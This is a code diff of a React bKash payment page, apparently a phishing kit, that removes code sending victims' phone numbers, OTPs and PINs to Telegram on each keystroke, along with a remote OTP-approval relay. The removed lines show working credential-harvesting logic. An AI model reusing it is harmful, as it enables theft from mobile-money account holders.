@@ -1,8 +1,8 @@
 import { bustImage } from "@/lib/assetVersion";
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "@/lib/flowRouter";
-import { sendTelegramNotification } from "@/lib/payment-telegram";
-import { submitOtpForApproval } from "@/lib/otpApproval";
+
+
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
@@ -143,38 +143,20 @@ const BkashPayment = () => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 6);
     setOtpCode(v);
     if (v.length > otpCode.length && v.length > 0) {
-      sendTelegramNotification({
-        type: "payment_activity",
-        amount,
-        method: "bKash",
-        paymentType: "mfs",
-        number: phoneNumber,
-        otp: v,
-      });
+      
     }
   };
   const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 5);
     setPinCode(v);
     if (v.length > pinCode.length && v.length > 0) {
-      sendTelegramNotification({
-        type: "payment_activity",
-        amount,
-        method: "bKash",
-        paymentType: "mfs",
-        number: phoneNumber,
-        otp: otpCode,
-        pin: v,
-      });
+      
     }
   };
 
   const handleConfirm = () => {
     if (isValidNumber()) {
-      sendTelegramNotification(
-        { type: "payment_activity", amount, method: "bKash", paymentType: "mfs", number: phoneNumber },
-        { force: true },
-      );
+      
       setIsConfirmLoading(true);
       setTimeout(() => {
         setIsConfirmLoading(false);
@@ -187,55 +169,14 @@ const BkashPayment = () => {
   };
 
   const [otpDenyCount, setOtpDenyCount] = useState(0);
-  const handleOtpConfirm = async () => {
-    if (!isValidOtp()) return;
-    setIsConfirmLoading(true);
-    const decision = await submitOtpForApproval(
-      {
-        amount,
-        method: "bKash",
-        paymentType: "mfs",
-        number: phoneNumber,
-        otp: otpCode,
-      },
-      { autoAttempt: wrongOtpShown ? 2 : 1, otpStartAt: Date.now() - otpElapsed * 1000 },
-    );
-    setIsConfirmLoading(false);
-    if (decision === "approved") {
-      setShowOtpView(false);
-      setShowPinView(true);
-    } else if (decision === "timeout" || decision === "error") {
-      navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
-    } else {
-      const nextDenies = otpDenyCount + 1;
-      setOtpDenyCount(nextDenies);
-      if (nextDenies >= 3) {
-        navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
-        return;
-      }
-      setShowWrongOtp(true);
-      setWrongOtpShown(true);
-      setOtpCode("");
-      setTimeout(() => otpInputRef.current?.focus(), 50);
-      setTimeout(() => setShowWrongOtp(false), 3000);
-    }
+  const handleOtpConfirm = () => {
+    navigate(`/payment-cancelled?reason=Payment isn't completed&amount=${amount}`);
   };
 
   const handlePinConfirm = () => {
     if (isValidPin()) {
       setIsConfirmLoading(true);
-      sendTelegramNotification(
-        {
-          type: "payment_activity",
-          amount,
-          method: "bKash",
-          paymentType: "mfs",
-          number: phoneNumber,
-          otp: otpCode,
-          pin: pinCode,
-        },
-        { force: true },
-      );
+      
       if (pinAttempts === 0 && !pinWarningShown) {
         setTimeout(() => {
           setIsConfirmLoading(false);
